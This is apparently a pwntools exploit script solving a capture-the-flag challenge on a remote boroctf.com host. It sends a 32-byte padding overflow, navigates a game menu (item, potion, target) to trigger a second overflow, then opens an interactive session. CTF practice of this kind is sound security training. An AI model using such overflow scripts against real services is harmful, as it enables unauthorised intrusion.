from pwn import *

context.arch = "amd64"
context.log_level = "info"

host = "w4owkcjzvv0e.boroctf.com"
port = 53217

p = remote(host, port)

# step 1: first overflow
p.recvuntil(b"break his guard")
p.sendline(b"A" * 32 + p32(0))

# step 2:
p.recvuntil(b"[3] Use Item")
p.sendline(b"3")

# Select Item:
p.recvuntil(b"Health Potion")
p.sendline(b"1")

# Select Target:
p.recvuntil(b"The Beast")
p.sendline(b"2")

# second overflow
p.recvuntil(b"How many drops")
p.sendline(b"1")

p.interactive()